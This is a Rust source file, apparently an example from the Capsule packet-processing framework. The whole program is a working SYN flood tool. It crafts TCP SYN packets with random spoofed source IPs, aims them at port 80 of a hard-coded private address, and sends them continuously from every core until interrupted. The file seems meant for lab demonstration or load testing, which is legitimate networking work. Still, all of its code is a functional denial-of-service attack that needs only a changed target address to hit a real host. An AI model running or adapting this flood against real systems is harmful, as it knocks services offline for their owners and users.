/*
* Copyright 2019 Comcast Cable Communications Management, LLC
*
* Licensed under the Apache License, Version 2.0 (the "License");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
*
* http://www.apache.org/licenses/LICENSE-2.0
*
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an "AS IS" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
*
* SPDX-License-Identifier: Apache-2.0
*/

use capsule::net::MacAddr;
use capsule::packets::ethernet::{Ethernet, EthernetError};
use capsule::packets::ip::v4::Ipv4;
use capsule::packets::ip::IpError;
use capsule::packets::tcp::{Tcp4, TcpError};
use capsule::packets::{Mbuf, Packet};
use capsule::runtime::{self, Runtime};
use signal_hook::consts;
use signal_hook::flag;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;
use thiserror::Error;
use tracing::{info, Level};
use tracing_subscriber::fmt;

#[derive(Error, Debug)]
enum SynFloodCreationError {
    #[error("Failed to create ethernet packet")]
    Ethernet(#[from] EthernetError),
    #[error("Failed to create IPv4 packet")]
    Ipv4(#[from] IpError),
    #[error("Failed to create TCP packet")]
    Tcp(#[from] TcpError),
}

fn syn_flood(mbuf: Mbuf, src_mac: MacAddr) -> Result<Mbuf, SynFloodCreationError> {
    let dst_ip = Ipv4Addr::new(10, 100, 1, 254);
    let dst_mac = MacAddr::new(0x02, 0x00, 0x00, 0xff, 0xff, 0xff);

    let mut ethernet = mbuf.push::<Ethernet>()?;
    ethernet.set_src(src_mac);
    ethernet.set_dst(dst_mac);

    let mut v4 = ethernet.push::<Ipv4>()?;
    v4.set_src(rand::random::<u32>().into());
    v4.set_dst(dst_ip);

    let mut tcp = v4.push::<Tcp4>()?;
    tcp.set_syn();
    tcp.set_seq_no(1);
    tcp.set_window(10);
    tcp.set_dst_port(80);
    tcp.reconcile_all();

    Ok(tcp.reset())
}

fn main() -> anyhow::Result<()> {
    let subscriber = fmt::Subscriber::builder()
        .with_max_level(Level::INFO)
        .finish();
    tracing::subscriber::set_global_default(subscriber)?;

    let config = runtime::load_config()?;
    let runtime = Runtime::from_config(config)?;

    let term = Arc::new(AtomicBool::new(false));

    let cap0 = runtime.ports().get("cap0")?;
    let src_mac = cap0.mac_addr();

    cap0.spawn_tx_pipeline(
        runtime.lcores(),
        128,
        Some(Duration::from_millis(50)),
        move |mbuf, ()| syn_flood(mbuf, src_mac),
        || (),
    )?;

    let _guard = runtime.execute()?;

    flag::register(consts::SIGINT, Arc::clone(&term))?;
    info!("ctrl-c to quit ...");
    while !term.load(Ordering::Relaxed) {}

    Ok(())
}
